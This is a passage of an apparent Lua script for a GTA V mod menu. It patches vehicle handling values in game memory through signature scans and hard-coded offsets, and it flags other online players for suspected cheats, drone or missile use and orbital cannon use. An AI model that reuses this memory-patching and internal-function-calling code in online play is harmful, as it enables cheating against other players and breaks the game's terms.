	{"fExtraLiftWithRoll", 0x00C4},
}

SubHandlingData =
{
	CBikeHandlingData =
	{
		{"fLeanFwdCOMMult", 0x0008},
		{"fLeanFwdForceMult", 0x000C},
		{"fLeanBakCOMMult", 0x0010},
		{"fLeanBakForceMult", 0x0014},
		{"fMaxBankAngle", 0x0018},
		{"fFullAnimAngle", 0x001C},
		{"fDesLeanReturnFrac", 0x0024},
		{"fStickLeanMult", 0x0028},
		{"fBrakingStabilityMult", 0x002C},
		{"fInAirSteerMult", 0x0030},
		{"fWheelieBalancePoint", 0x0034},
		{"fStoppieBalancePoint", 0x0038},
		{"fWheelieSteerMult", 0x003C},
		{"fRearBalanceMult", 0x0040},
		{"fFrontBalanceMult", 0x0044},
		{"fBikeGroundSideFrictionMult", 0x0048},
		{"fBikeWheelGroundSideFrictionMult", 0x004C},
		{"fBikeOnStandLeanAngle", 0x0050},
		{"fBikeOnStandSteerAngle", 0x0054},
		{"fJumpForce", 0x0058},
	},
	CFlyingHandlingData = CFlyingHandlingData,
	CFlyingHandlingData2 = CFlyingHandlingData,
	CBoatHandlingData =
	{
		{"fBoxFrontMult", 0x0008},
		{"fBoxRearMult", 0x000C},
		{"fBoxSideMult", 0x0010},
		{"fSampleTop", 0x0014},
		{"fSampleBottom", 0x0018},
		{"fSampleBottomTestCorrection", 0x001C},
		{"fAquaplaneForce", 0x0020},
		{"fAquaplanePushWaterMult", 0x0024},
		{"fAquaplanePushWaterCap", 0x0028},
		{"fAquaplanePushWaterApply", 0x002C},
		{"fRudderForce", 0x0030},
		{"fRudderOffsetSubmerge", 0x0034},
		{"fRudderOffsetForce", 0x0038},
		{"fRudderOffsetForceZMult", 0x003C},
		{"fWaveAudioMult", 0x0040},
		{"vecMoveResistanceX", 0x0050},
		{"vecMoveResistanceY", 0x0054},
		{"vecMoveResistanceZ", 0x0058},
		{"vecTurnResistanceX", 0x0060},
		{"vecTurnResistanceY", 0x0064},
		{"vecTurnResistanceZ", 0x0068},
		{"fLook_L_R_CamHeight", 0x0070},
		{"fDragCoefficient", 0x0074},
		{"fKeelSphereSize", 0x0078},
		{"fPropRadius", 0x007C},
		{"fLowLodAngOffset", 0x0080},
		{"fLowLodDraughtOffset", 0x0084},
		{"fImpellerOffset", 0x0088},
		{"fImpellerForceMult", 0x008C},
		{"fDinghySphereBuoyConst", 0x0090},
		{"fProwRaiseMult", 0x0094},
		{"fDeepWaterSampleBuoyancyMult", 0x0098},
		{"fTransmissionMultiplier", 0x009C},
		{"fTractionMultiplier", 0x00A0},
	},
	CSeaPlaneHandlingData =
	{
		{"fPontoonBuoyConst", 0x0010},
		{"fPontoonSampleSizeFront", 0x0014},
		{"fPontoonSampleSizeMiddle", 0x0018},
		{"fPontoonSampleSizeRear", 0x001C},
		{"fPontoonLengthFractionForSamples", 0x0020},
		{"fPontoonDragCoefficient", 0x0024},
		{"fPontoonVerticalDampingCoefficientUp", 0x0028},
		{"fPontoonVerticalDampingCoefficientDown", 0x002C},
		{"fKeelSphereSize", 0x0030},
	},
	CSubmarineHandlingData =
	{
		{"vTurnResX", 0x0010},
		{"vTurnResY", 0x0014},
		{"vTurnResZ", 0x0018},
		{"fMoveResXY", 0x0020},
		{"fMoveResZ", 0x0024},
		{"fPitchMult", 0x0028},
		{"fPitchAngle", 0x002C},
		{"fYawMult", 0x0030},
		{"fDiveSpeed", 0x0034},
		{"fRollMult", 0x0038},
		{"fRollStab", 0x003C}
	},
	CTrainHandlingData =
	{
	},
	CTrailerHandlingData =
	{
	},
	CCarHandlingData =
	{
		{"fBackEndPopUpCarImpulseMult", 0x0008},
		{"fBackEndPopUpBuildingImpulseMult", 0x000C},
		{"fBackEndPopUpMaxDeltaSpeed", 0x0010},
		{"fToeFront", 0x0014},
		{"fToeRear", 0x0018},
		{"fCamberFront", 0x001C},
		{"fCamberRear", 0x0020},
		{"fCastor", 0x0024},
		{"fEngineResistance", 0x0028},
		{"fMaxDriveBiasTransfer", 0x002C},
		{"fJumpForceScale", 0x0030},
		--{"strAdvancedFlags", 0x003C},
	},
	CVehicleWeaponHandlingData =
	{
		{"fUvAnimatiomMult", 0x0320},
		{"fMiscGadgetVar", 0x0324},
		{"fWheelImpactOffset", 0x0328}
	},
	CSpecialFlightHandlingData =
	{
		{"vecAngularDampingX", 0x0010},
		{"vecAngularDampingY", 0x0014},
		{"vecAngularDampingZ", 0x0018},
		{"vecAngularDampingMinX", 0x0020},
		{"vecAngularDampingMinY", 0x0024},
		{"vecAngularDampingMinZ", 0x0028},
		{"vecLinearDampingX", 0x0030},
		{"vecLinearDampingY", 0x0034},
		{"vecLinearDampingZ", 0x0038},
		{"vecLinearDampingMinX", 0x0040},
		{"vecLinearDampingMinY", 0x0044},
		{"vecLinearDampingMinZ", 0x0048},
		{"fLiftCoefficient", 0x0050},
		{"fMinLiftVelocity", 0x0060},
		{"fDragCoefficient", 0x006C},
		{"fRollTorqueScale", 0x0070},
		{"fYawTorqueScale", 0x007C},
		{"fMaxPitchTorque", 0x0088},
		{"fMaxSteeringRollTorque", 0x008C},
		{"fPitchTorqueScale", 0x0090},
		{"fMaxThrust", 0x0098},
		{"fTransitionDuration", 0x009C},
		{"fHoverVelocityScale", 0x00A0},
		{"fMinSpeedForThrustFalloff", 0x00A8},
		{"fBrakingThrustScale", 0x00AC},
		--{"strFlags", 0x00B8},
	},
}

-------------------------------------
-- HANDLING SECTION
-------------------------------------

local subHandlingClasses =
{
	[0]  = "CBikeHandlingData",
	[1]  = "CFlyingHandlingData",
	[2]  = "CFlyingHandlingData2",
	[3]  = "CBoatHandlingData",
	[4]  = "CSeaPlaneHandlingData",
	[5]  = "CSubmarineHandlingData",
	[6]  = "CTrainHandlingData",
	[7]  = "CTrailerHandlingData",
	[8]  = "CCarHandlingData",
	[9]  = "CVehicleWeaponHandlingData",
	[10] = "CSpecialFlightHandlingData",
}


---@param subHandling integer
---@return integer
local function get_sub_handling_type(subHandling)
	local funAddress = memory.read_long(memory.read_long(subHandling) + 16)
	return util.call_foreign_function(funAddress, subHandling)
end


---@param handlingData integer
---@return {type: integer, address: integer}[]
local function get_sub_handling_array(handlingData)
	local subHandlingArray = memory.read_long(handlingData + 0x158)
	local numSubHandling = memory.read_ushort(handlingData + 0x160)
	local arr = {}
	local index = 0
	local t = -1

	while true do
		local subHandling = memory.read_long(subHandlingArray + index * 8)
		if subHandling == NULL then
			goto NotFound
		end

		t = get_sub_handling_type(subHandling)
		if t >= 0 and t <= 10 then
			table.insert(arr, {type = t, address = subHandling})
		end

	::NotFound::
		index = index + 1
		if index >= numSubHandling then break end
	end

	return arr
end


local GetVehicleModelInfo = 0
memory_scan("GVMI", "48 89 5C 24 ? 57 48 83 EC 20 8B 8A ? ? ? ? 48 8B DA", function (address)
	GetVehicleModelInfo = memory.rip(address + 0x2A)
end)


local GetHandlingDataFromIndex = 0
memory_scan("GHDFI", "40 53 48 83 EC 30 48 8D 54 24 ? 0F 29 74 24 ?", function (address)
	GetHandlingDataFromIndex = memory.rip(address + 0x37)
end)


---@param modelHash Hash
---@return integer CVehicleModelInfo*
local function get_vehicle_model_info(modelHash)
	return util.call_foreign_function(GetVehicleModelInfo, modelHash, NULL)
end


---@param modelInfo integer CVehicleModelInfo*
---@return integer CHandlingData*
local function get_vehicle_model_handling_data(modelInfo)
	return util.call_foreign_function(GetHandlingDataFromIndex, memory.read_uint(modelInfo + 0x4B8))
end


-------------------------------------
-- HANDLING DATA
-------------------------------------

---@class HandlingData
HandlingData =
{
	reference = 0,
	name = "",
	address = NULL,
	visible = true,
	offsets = {},
	open = false,
}
HandlingData.__index = HandlingData


---@param parent integer
---@param name string
---@param address integer
---@param offsets {[1]:string, [2]:integer}[]
---@return HandlingData
HandlingData.new = function (parent, name, address, offsets)
	local self = setmetatable({address = address, name = name, offsets = offsets}, HandlingData)
	self.reference = menu.list(parent, name, {}, "", function()
		self.open = true
	end, function()
		self.open = false
	end)

	menu.divider(self.reference, name)
	for _, tbl in ipairs(offsets) do self:addOption(self.reference, tbl[1], tbl[2]) end
	return self
end


---@param self HandlingData
---@param parent integer
---@param name string
---@param offset integer
HandlingData.addOption = function(self, parent, name, offset)
	local value = memory.read_float(self.address + offset) * 100

	menu.slider_float(parent, name, {name}, "", -1e6, 1e6, math.floor(value), 1, function(new)
		memory.write_float(self.address + offset, new / 100)
	end)
end


HandlingData.Remove = function(self)
	menu.delete(self.reference)
end


function HandlingData:get()
	local r = {}

	for _, tbl in ipairs(self.offsets) do
		local value = memory.read_float(self.address + tbl[2])
		r[tbl[1]] = round(value, 3)
	end

	return r
end


function HandlingData:set(values)
	local count = 0

	for _, tbl in ipairs(self.offsets) do
		local value = values[tbl[1]]

		if not value then
			goto label_continue
		end

		memory.write_float(self.address + tbl[2], value)
		count = count + 1

	::label_continue::
	end
end


-------------------------------------
-- HANDLING EDITOR
-------------------------------------


---@class VehicleList
VehicleList = {selected = 0, root = 0, name = "", onClick = nil}
VehicleList.__index = VehicleList

---@param parent integer
---@param name string
---@param onClick fun(vehicle: Hash)?
---@return VehicleList
function VehicleList.new(parent, name, onClick)
	local self = setmetatable({name = name, onClick = onClick}, VehicleList)
	self.root = menu.list(parent, name, {}, "")

	local classLists = {}
	for _, vehicle in ipairs(util.get_vehicles()) do
		local nameHash = util.joaat(vehicle.name)
		local class = VEHICLE.GET_VEHICLE_CLASS_FROM_NAME(nameHash)

		if not classLists[class] then
			classLists[class] = menu.list(self.root, util.get_label_text("VEH_CLASS_" .. class), {}, "")
		end

		local menuName = util.get_label_text(vehicle.name)
		if menuName == "NULL" then
			goto label_coninue
		end

		menu.action(classLists[class], util.get_label_text(vehicle.name), {}, "", function()
			self:setSelected(nameHash, vehicle.name)
			menu.focus(self.root)
		end)
	::label_coninue::
	end

	return self
end


---@param nameHash Hash
---@param vehicleName string?
function VehicleList:setSelected(nameHash, vehicleName)
	if not vehicleName then
		vehicleName = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(nameHash)
	end
	menu.set_menu_name(self.root, self.name .. ": " .. util.get_label_text(vehicleName))
	self.selected = nameHash
	if self.onClick then self.onClick(nameHash) end
end


-------------------------------------
-- FILE LIST
-------------------------------------

---@class FileList
FileList = {
	dir = "",
	ext = "json",
	open = false,
	reference = 0,
	options = {},
	fileOpts = {},
	onClick = nil
}
FileList.__index = FileList


---@param parent integer
---@param name string
---@param options table
---@param dir string
---@param ext string
---@param onClick fun(opt: integer, fileName: string, path: string)
---@return FileList
function FileList.new(parent, name, options, dir, ext, onClick)
	local self = setmetatable({dir = dir, ext = ext, options = options}, FileList)
	self.fileOpts = {}
	self.onClick = onClick

	self.reference = menu.list(parent, name, {}, "", function()
		self.open = true
		self:load()
	end, function()
		self.open = false
		self:clear()
	end)

	return self
end


function FileList:load()
	if not self.dir or not filesystem.exists(self.dir) then
		return
	end

	for _, path in ipairs(filesystem.list_files(self.dir)) do
		local name, ext = string.match(path, '^.+\\(.+)%.(.+)$')
		if not self.ext or self.ext == ext then self:createOpt(name, path) end
	end
end


---@param fileName string
---@param path string
function FileList:createOpt(fileName, path)
	local list = menu.list(self.reference, fileName, {}, "")

	for i, opt in ipairs(self.options) do
		menu.action(list, opt, {}, "", function() self.onClick(i, fileName, path) end)
	end

	self.fileOpts[#self.fileOpts+1] = list
end


function FileList:clear()
	if #self.fileOpts == 0 then
		return
	end

	for i, ref in ipairs(self.fileOpts) do
		menu.delete(ref); self.fileOpts[i] = nil
	end
end


---@param file string #Must include file extension.
---@param content string
function FileList:add(file, content)
	assert(self.dir ~= "", "tried to add a file to a null directory")
	if not filesystem.exists(self.dir) then
		filesystem.mkdir(self.dir)
	end

	local name, ext = string.match(file, '^(.+)%.(.+)$')
	local count = 1

	while filesystem.exists(self.dir .. file) do
		count = count + 1
		file = string.format("%s (%s).%s", name, count, ext)
	end

	local file <close> = assert(io.open(self.dir .. file, "w"))
	file:write(content)
end


function FileList:reload()
	self:clear()
	self:load()
end

-------------------------------------
-- AUTOLOAD LIST
-------------------------------------


local handlingTrans <const> =
{
	SetVehicle = translate("Handling Editor", "Set Vehicle"),
	CurrentVehicle = translate("Handling Editor", "Current Vehicle"),
	SaveHandling = translate("Handling Editor", "Save Handling Data"),
	SavedFiles = translate("Handling Editor", "Saved Files"),
	Load = translate("Handling Editor", "Load"),
	Delete = translate("Handling Editor", "Delete"),
	Autoload = translate("Handling Editor", "Autoload"),
	Saved = translate("Handling Editor", "Handling file saved"),
	Loaded = translate("Handling Editor", "Handling file successfully loaded"),
	WillAutoload = translate("Handling Editor", "File '%s' will be autoloaded"),
	HandlingEditor = translate("Handling Editor", "Handling Editor"),
	AutoloadedFiles = translate("Handling Editor", "Autoloaded Files"),
	ClickToDelete = translate("Handling Editor", "Click to delete"),
	SavedHelp = translate("Handling Editor", "Saved handling files for the selected vehicle model")
}


---@class AutoloadList
AutoloadList = {reference = 0, options = {}}
AutoloadList.__index = AutoloadList


---@param parent integer
---@param name string
---@return AutoloadList
function AutoloadList.new(parent, name)
	local self = setmetatable({options = {}}, AutoloadList)

	self.reference = menu.list(parent, name, {}, "")
	return self
end


---@param vehLabel string
---@param file string
function AutoloadList:push(vehLabel, file)
	local vehName = util.get_label_text(vehLabel)

	if self.options[vehName] then
		menu.delete(self.options[vehName])
	end

	self.options[vehName] = menu.action(self.reference, string.format("%s: %s", vehName, file), {}, handlingTrans.ClickToDelete, function()
		Config.handlingAutoload[vehLabel] = nil
		menu.delete(self.options[vehName])
	end)
end


-------------------------------------
-- HANDLING EDITOR
-------------------------------------


---@class HandlingData
HandlingEditor =
{
	references = {root = 0, meta = 0},
	handlingData = nil,
	subHandlings = {},
	currentVehicle = 0,
	open = false,
	---@type FileList
	filesList = nil,
	---@type AutoloadList
	autoloads = nil
}
HandlingEditor.__index = HandlingEditor



---@param parent integer
---@param name string
---@return HandlingData
function HandlingEditor.new(parent, name)
	local self = setmetatable({subHandlings = {}, references = {}}, HandlingEditor)
	self.references.root = menu.list(parent, name, {}, "", function()
		self.open = true
	end, function() self.open = false end)


	local vehList = VehicleList.new(self.references.root, handlingTrans.SetVehicle, function (vehicle)
		self:SetCurrentVehicle(vehicle)
	end)


	menu.action(self.references.root, handlingTrans.CurrentVehicle, {}, "", function ()
		local vehicle = entities.get_user_vehicle_as_handle()
		if vehicle ~= 0 then vehList:setSelected(ENTITY.GET_ENTITY_MODEL(vehicle)) end
	end)


	self.references.meta = menu.list(self.references.root, "Meta", {}, "")

	menu.action(self.references.meta, handlingTrans.SaveHandling, {}, "", function()
		local ok, msg = self:save()
		if not ok then
			return notification:help(capitalize(msg), HudColour.red)
		end
		notification:normal(handlingTrans.Saved, HudColour.purpleDark)
	end)


	local fileOpts <const> =
	{
		handlingTrans.Load,
		handlingTrans.Autoload,
		handlingTrans.Delete,
	}

	self.filesList = FileList.new(self.references.meta, handlingTrans.SavedFiles, fileOpts, "", "json", function (opt, fileName, path)
		if  opt == 1 then
			local ok, msg = self:load(path)
			if not ok then
				return notification:help(capitalize(msg), HudColour.red)
			end
			self:SetCurrentVehicle(self.currentVehicle) -- reloading
			notification:normal(handlingTrans.Loaded, HudColour.purpleDark)

		elseif opt == 3 then
			os.remove(path)
			self.filesList:reload()

		elseif opt == 2 then
			local name = VEHICLE.GET_DISPLAY_NAME_FROM_VEHICLE_MODEL(self.currentVehicle)
			if name == "CARNOTFOUND" then
				return
			end
			Config.handlingAutoload[name] = fileName
			self.autoloads:push(name, fileName)
			notification:normal(string.format(handlingTrans.WillAutoload, fileName), HudColour.purpleDark)
		end
	end)

	menu.set_help_text(self.filesList.reference, handlingTrans.SavedHelp)
	self.autoloads = AutoloadList.new(self.references.meta, handlingTrans.AutoloadedFiles)
	return self
end



---@param hash Hash
function HandlingEditor:SetCurrentVehicle(hash)
	if self.handlingData then self:clear() end
	self.currentVehicle = hash
	local root = self.references.root
	local modelInfo = get_vehicle_model_info(hash)
	if modelInfo == NULL then
		return
	end

	local handlingAddress = get_vehicle_model_handling_data(modelInfo)
	if handlingAddress == NULL then
		return
	end

	self.handlingData = HandlingData.new(root, "CHandlingData", handlingAddress, CHandlingData)
	local subHandlings = get_sub_handling_array(handlingAddress)

	for _, subHandling in ipairs(subHandlings) do
		if subHandling.address == NULL then
			continue
		end
		local name = subHandlingClasses[subHandling.type]
		local offsets = SubHandlingData[name]
		if not self.subHandlings[name] then self.subHandlings[name] = HandlingData.new(root, name, subHandling.address, offsets) end
	end

	local vehicleName = memory.read_string(modelInfo + 0x298)
	self.filesList.dir = lenaDir .. "handling\\" .. string.lower(vehicleName) .. "\\"
end



function HandlingEditor:clear()
	self.handlingData:Remove()
	for _, h in pairs(self.subHandlings) do h:Remove() end

	self.handlingData = nil
	self.subHandlings = {}
	self.currentVehicle = 0
	self.filesList.dir = ""
end



---@return boolean
---@return string? errmsg
function HandlingEditor:save()
	if not self.handlingData then
		return false, "handling data not found"
	end

	local input = ""
	local label = customLabels.EnterFileName

	while true do
		input = get_input_from_screen_keyboard(label, 31, "")
		if input == "" then
			return false, "save canceled"
		end
		if not input:find '[^%w_%.%-]' then break end
		label = customLabels.InvalidChar
		util.yield(200)
	end

	local data = {}
	data[self.handlingData.name] = self.handlingData:get()

	for _, subHandling in pairs(self.subHandlings) do
		data[subHandling.name] = subHandling:get()
	end

	self.filesList:add(input .. ".json", json.stringify(data, nil, 4))
	return true, nil
end



---@param path string
---@return boolean
---@return string? errmsg
function HandlingEditor:load(path)
	if not self.handlingData then
		return false, "handling data not found"
	end

	if not filesystem.exists(path) then
		return false, "file does not exist"
	end

	local ok, result = json.parse(path, false)
	if not ok then
		return false, result
	end

	self.handlingData:set(result.CHandlingData)

	for name, subHandling in pairs(self.subHandlings) do
		if result[name] then subHandling:set(result[name]) end
	end

	return true, nil
end


---@return integer
function HandlingEditor:autoload()
	local count = 0

	for vehicle, file in pairs(Config.handlingAutoload) do
		local path =  lenaDir .. "handling\\" .. string.lower(vehicle) .. "\\" .. file .. ".json"
		local modelHash = util.joaat(vehicle)

		self:SetCurrentVehicle(modelHash)
		if  self:load(path) then
			self.autoloads:push(vehicle, file)
			count = count + 1
		end
	end

	if self.handlingData then self:clear() end
	return count
end



g_handlingEditor = HandlingEditor.new(vehicle, handlingTrans.HandlingEditor)

local numFilesLoaded = g_handlingEditor:autoload()

-------------------------------------
-------------------------------------
-- Detections
-------------------------------------
-------------------------------------

-------------------------------------
-- Super Drive
-------------------------------------

menu.toggle_loop(detections, "Super Drive", {}, "", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
            notify(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

-------------------------------------
-- Spectate
-------------------------------------

menu.toggle_loop(detections, "Spectate", {}, "Detects if someone is spectating you.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        for i, interior in ipairs(interior_stuff) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            if not util.is_session_transition_active() and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior
            and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
                if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(pid)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 20.0 then
                    notify(players.get_name(pid) .. " Is Watching You")
                    break
                end
            end
        end
    end
end)

-------------------------------------
-- Teleport
-------------------------------------

menu.toggle_loop(detections, "Teleport", {}, "Detects if the player has teleported", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local oldpos = players.get_position(pid)
            wait(1000)
            local currentpos = players.get_position(pid)
            if get_transition_state(pid) ~= 0 then
                for i, interior in ipairs(interior_stuff) do
                    if v3.distance(oldpos, currentpos) > 500 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z then
                        wait(500)
                        if get_interior_player_is_in(pid) == interior and PLAYER.IS_PLAYER_PLAYING(pid) and players.exists(pid) then
                            notify(players.get_name(pid) .. " Just teleported")
                        end
                    end
                end
            end
        end
    end
end)

-------------------------------------
-- Drones & Missiles
-------------------------------------

local trans =
{
	FlyingDrone = translate("Protections", "%s is flying a drone"),
	LaunchedMissile = translate("Protections", "%s is using a guided missile"),
	NearDrone = translate("Protections", "%s's drone is ~r~nearby~s~"),
	NearMissile = translate("Protections", "%s's guided missile is ~r~nearby~s~"),
}
local notificationBits = 0
local nearbyNotificationBits = 0
local blips = {}
local help =
translate("Protections", "Notifies when a player is flying a drone or launched a guided missile " ..
"and shows it on the map when nearby")


---@param player Player
---@return boolean
local function IsPlayerFlyingAnyDrone(player)
	local address = memory.script_global(1853348 + (player * 834 + 1) + 267 + 348)
	return BitTest(memory.read_int(address), 26)
end


---@param player Player
---@return integer
local function GetPlayerDroneType(player)
	local p_type = memory.script_global(1911933 + (player * 260 + 1) + 93)
	return memory.read_int(p_type)
end


---@param player Player
---@return Object
local function GetPlayerDroneObject(player)
	local p_object = memory.script_global(1911933 + (players.user() * 260 + 1) + 60 + (player + 1))
	return memory.read_int(p_object)
end


---@param heading number
---@return number
local function InvertHeading(heading)
	if heading > 180.0 then
		return heading - 180.0
	end
	return heading + 180.0
end


---@param droneType integer
---@return integer
local function GetDroneBlipSprite(droneType)
	return (droneType == 8 or droneType == 4) and 548 or 627
end


---@param droneType integer
---@return string
local function GetNotificationMsg(droneType, nearby)
	if droneType == 8 or droneType == 4 then
		return nearby and trans.NearMissile or trans.LaunchedMissile
	end
	return nearby and trans.NearDrone or trans.FlyingDrone
end


---@param index integer
local function RemoveBlipIndex(index)
	if HUD.DOES_BLIP_EXIST(blips[index]) then
		util.remove_blip(blips[index]); blips[index] = 0
	end
end


---@param player Player
function AddBlipForPlayerDrone(player)
	if not blips[player] then
		blips[player] = 0
	end

	if is_player_active(player, true, true) and players.user() ~= player and IsPlayerFlyingAnyDrone(player) then
		if ENTITY.DOES_ENTITY_EXIST(GetPlayerDroneObject(player)) then
			local obj = GetPlayerDroneObject(player)
			local pos = ENTITY.GET_ENTITY_COORDS(obj, true)
			local heading = InvertHeading(ENTITY.GET_ENTITY_HEADING(obj))

			if not HUD.DOES_BLIP_EXIST(blips[player]) then
				blips[player] = HUD.ADD_BLIP_FOR_ENTITY(obj)
				local sprite = GetDroneBlipSprite(GetPlayerDroneType(player))
				HUD.SET_BLIP_SPRITE(blips[player], sprite)
				HUD.SHOW_HEIGHT_ON_BLIP(blips[player], false)
				HUD.SET_BLIP_SCALE(blips[player], 0.8)
				HUD.SET_BLIP_NAME_TO_PLAYER_NAME(blips[player], player)
				HUD.SET_BLIP_COLOUR(blips[player], get_player_org_blip_colour(player))

			else
				HUD.SET_BLIP_DISPLAY(blips[player], 2)
				HUD.SET_BLIP_COORDS(blips[player], pos.x, pos.y, pos.z)
				HUD.SET_BLIP_ROTATION(blips[player], math.ceil(heading))
				HUD.SET_BLIP_PRIORITY(blips[player], 9)
			end

			if not BitTest(nearbyNotificationBits, player) and HUD.DOES_BLIP_EXIST(blips[player]) then
				local msg = GetNotificationMsg(GetPlayerDroneType(player), true)
				notification:normal(msg, HudColour.purpleDark, get_condensed_player_name(player))
				nearbyNotificationBits = SetBit(nearbyNotificationBits, player)
			end

		else
			RemoveBlipIndex(player)
			nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
		end

		if not BitTest(notificationBits, player) then
			local msg = GetNotificationMsg(GetPlayerDroneType(player), false)
			notification:normal(msg, HudColour.purpleDark, get_condensed_player_name(player))
			notificationBits = SetBit(notificationBits, player)
		end

	else
		RemoveBlipIndex(player)
		notificationBits = ClearBit(notificationBits, player)
		nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
	end
end


menu.toggle_loop(protex, "Missile and Drone Detection", {}, "Drone/Missile Detection", function()
	if NETWORK.NETWORK_IS_SESSION_ACTIVE() then
		for player = 0, 32 do AddBlipForPlayerDrone(player) end
	end
end, function()
	for i in pairs(blips) do RemoveBlipIndex(i) end
	notificationBits = 0
	nearbyNotificationBits = 0
end)

-------------------------------------
-- Missile Detection
-------------------------------------

local kosatka_missile_blips = {}
local draw_kosatka_blips = false
menu.toggle(detections, "Kosatka missile warning", {}, "", function(on)
    draw_kosatka_blips = on
    while true do
        if not draw_kosatka_blips then 
            for hdl, blip in pairs(kosatka_missile_blips) do 
                kosatka_missile_blips[hdl] = nil
                util.remove_blip(blip)
            end
            break 
        end
        if util.is_session_started() then
            local missile_ct = 0
            for _, ent_ptr in pairs(entities.get_all_objects_as_pointers()) do 
                if entities.get_model_hash(ent_ptr) == util.joaat("h4_prop_h4_airmissile_01a") then
                    local hdl = entities.pointer_to_handle(ent_ptr)
                    local pos = entities.get_position(ent_ptr)
                    if kosatka_missile_blips[hdl] == nil then 
                        local blip = HUD.ADD_BLIP_FOR_COORD(pos.x, pos.y, pos.z)
                        HUD.SET_BLIP_SPRITE(blip, 548)
                        HUD.SET_BLIP_COLOUR(blip, 59)
                        HUD.SET_BLIP_ROTATION(blip, math.ceil(ENTITY.GET_ENTITY_HEADING(hdl)))
                        kosatka_missile_blips[hdl] = blip
                    else
                        HUD.SET_BLIP_ROTATION(kosatka_missile_blips[hdl], math.ceil(ENTITY.GET_ENTITY_HEADING(hdl)+180))
                        HUD.SET_BLIP_COORDS(kosatka_missile_blips[hdl], pos.x, pos.y, pos.z)
                    end
                    missile_ct += 1
                end
            end
            if missile_ct > 0 then 
                util.draw_debug_text(missile_ct .. "kosatka missile(s) currently active")
            end
            for hdl, blip in pairs(kosatka_missile_blips) do 
                if not ENTITY.DOES_ENTITY_EXIST(hdl) then
                    kosatka_missile_blips[hdl] = nil
                    util.remove_blip(blip)
                end
            end
        end
        util.yield()
    end
end)

-------------------------------------
-- Orb Detection
-------------------------------------

----- Credits to Wifey -----
----- Florentina       -----

local IsInOrbRoom = {}
local IsOutOfOrbRoom = {}
local IsAtOrbTable = {}
local IsNotAtOrbTable = {}

announce_it = false

util.create_tick_handler(function()  
    for pid = 0,31 do
        if players.get_position(pid).x > 323 and players.get_position(pid).y < 4834 and players.get_position(pid).y > 4822 and players.get_position(pid).z <= -59.36 then
            if IsOutOfOrbRoom[pid] and not IsInOrbRoom[pid] then
                notify("" .. tostring(players.get_name(pid)) .. " has entered the orbital cannon room!")
                if announce_it == true then
                    chat.send_message("> " .. players.get_name(pid) .. " entered the orbital cannon room", true, true, true)
                end
            end
            if players.get_position(pid).x < 331 and players.get_position(pid).x > 330.40 and players.get_position(pid).y > 4830 and players.get_position(pid).y < 4830.40 and players.get_position(pid).z <= -59.36 then
                if IsNotAtOrbTable[pid] and not IsAtOrbTable[pid] then
                    notify("" .. tostring(players.get_name(pid)) .. " might be about to call an orbital strike ;)")
                    if announce_it == true then
                        chat.send_message("> " .. tostring(players.get_name(pid)) .. " might be about to call an orbital strike ;)", true, true, true)
                    end
                end
                IsAtOrbTable[pid] = true
                IsNotAtOrbTable[pid] = false
            end
            IsInOrbRoom[pid] = true
            IsOutOfOrbRoom[pid] = false
        else
            if IsInOrbRoom[pid] and not IsOutOfOrbRoom[pid] then
                notify("" .. tostring(players.get_name(pid)) .. " has left the orbital cannon room!")
                if announce_it == true then
                    chat.send_message("> " .. players.get_name(pid) .. " left the orbital cannon room", true, true, true)
                end
            end
            IsAtOrbTable[pid] = false
            IsInOrbRoom[pid] = false
            IsOutOfOrbRoom[pid] = true
            IsNotAtOrbTable[pid] = true
        end
    end
end)

menu.toggle_loop(detections, "Dispatch In Org Chat", {""}, "", function ()
    announce_it = true
    end, function ()
    announce_it = false
end)

-------------------------------------
-- Stat Detection
-------------------------------------

local isLegit = {}
local mightNotBeLegit = {}
menu.toggle_loop(detections, "Detect Unlegit Stats", {""}, "Permanently lets your menu scan for not legit players", function ()
    for pid = 0,31 do
        local rank = players.get_rank(pid)
        local money = players.get_money(pid)
        local kills = players.get_kills(pid)
        local kdratio = players.get_kd(pid)
        if kdratio < 0 or kdratio > 12  or kills > 1000000 or rank > 1000 or money > 2000000000 then
            if isLegit[pid] and not mightNotBeLegit[pid] then
                thprnotify("" .. players.get_name(pid) .. " might not be legit. Rank: " .. rank .. " Money: " .. string.format("%.2f", money/1000000) .. "M$ Kill: " .. kills .. " KD: " .. string.format("%.2f", kdratio))
            end
            isLegit[pid] = false
            mightNotBeLegit[pid] = true
        else
            isLegit[pid] = true
            mightNotBeLegit[pid] = false
        end
        wait(1000)
    end
end)

-------------------------------------
-------------------------------------
-- Misc
-------------------------------------
-------------------------------------

-------------------------------------
-- Anti Crash
-------------------------------------

menu.toggle(misc, "Render GTA uncrashable", {"panic"}, "Will render GTAV uncrashable", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
